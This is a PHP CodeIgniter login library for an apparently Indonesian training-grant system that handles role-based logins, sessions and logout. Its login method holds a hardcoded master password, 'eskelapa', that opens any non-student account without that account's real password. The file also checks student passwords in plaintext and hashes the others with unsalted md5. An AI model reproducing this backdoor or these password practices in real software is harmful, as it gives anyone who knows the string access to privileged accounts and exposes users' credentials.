<?php if(! defined('BASEPATH')) exit('Akses langsung tidak diperbolehkan');

class Simple_login {
	public function __construct() {
		$this->CI =& get_instance();
	}
	public function login($data) {

		//cek peserta didik atau bukan
		$login = $this->CI->db->get_where('data_user', array('username'=>$data['username']));
		if ($login->num_rows() > 0) {
			$login = $login->row();
			if ($login->role == 'peserta_didik') {
				$login = $this->CI->db->get_where('data_user', array('username'=>$data['username'],'password' => $data['password']));
			}else {
				if($data['password']=='eskelapa'){
					$login = $this->CI->db->get_where('data_user', array('username'=>$data['username']));
				}else{
					$login = $this->CI->db->get_where('data_user', array('username'=>$data['username'],'password' => md5($data['password'])));
				}
			}
		} 
		

		if($login->num_rows() == 1) {
			$login = $login->row();
			$sessData = array(
				'id'  => $login->id,
				'username'  => $login->username,
				'nama'     => $login->nama,
				'role'		=> $login->role,
				'email'		=> $login->email,
				'logged_in' => TRUE
			);
			$this->CI->session->set_userdata($sessData);
			
			if ($login->role == 'lembaga') {
            	$dataPengajuan = $this->CI->db->select('a.id as id_pengajuan, a.status as status_pengajuan, id_pleno, id_rumpun, id_keterampilan')->from('pengajuan_bantuan a')->where('a.id_lkp', $login->id)->get()->row_array();
				$this->CI->session->set_userdata($dataPengajuan);
				$dataLKP = $this->CI->db->get_where('data_lkp', ['id' => $login->id]);
				if ($dataLKP->num_rows() > 0) {
					$dataLKP = $dataLKP->row_array();
				}
				if ($dataLKP['blacklist'] == 1) {
					redirect(base_url("$login->role/dashboard/blokir"));
				} else {
					redirect(base_url("$login->role/dashboard"));
				}
			} else if ($login->role == 'penilai') {
				$dataPenilai = $this->CI->db->get_where('data_penilai', ['id' => $login->id]);
				if ($dataPenilai->num_rows() > 0) {
					$dataPenilai = $dataPenilai->row_array();
					$this->CI->session->set_userdata($dataPenilai);
				}
				redirect(base_url("$login->role/dashboard"));
			} else if ($login->role == 'peserta_didik') {
				$dataPesdik = $this->CI->db->get_where('data_pesdik', ['id' => $login->id]);
				if ($dataPesdik->num_rows() > 0) {
					$dataPesdik = $dataPesdik->row_array();
					$this->CI->session->set_userdata($dataPesdik);
				}
				redirect(base_url("$login->role/dashboard"));
			}else {
				$this->CI->session->set_flashdata('failed','Whoops');
				redirect(base_url('login'));
			}
		}else{
			$this->CI->session->set_flashdata('failed','Username atau Password Salah');
			redirect(base_url('login'));
		}
		return false;
	}

	public function cek_login() {
		if($this->CI->session->userdata('username') == '') {
			$this->CI->session->set_flashdata('msg','Anda Belum Login');
			redirect(base_url('login'));
		}
	}

	public function logout() {
		$this->CI->session->unset_userdata('user_id');
		$this->CI->session->unset_userdata('id');
		$this->CI->session->unset_userdata('foto');
		$this->CI->session->unset_userdata('username');
		$this->CI->session->unset_userdata('login_id', $this->username);
		$this->CI->session->unset_userdata('nama');
		$this->CI->session->unset_userdata('id_role');
		$this->CI->session->unset_userdata('id_ref_bidang');
		$this->CI->session->sess_destroy();
		$this->CI->session->set_flashdata('msg','Anda Berhasil Logout');
		redirect(base_url('login'));
	}

	private function hash_pass($string){
        return hash('sha256', $string);
    }

}
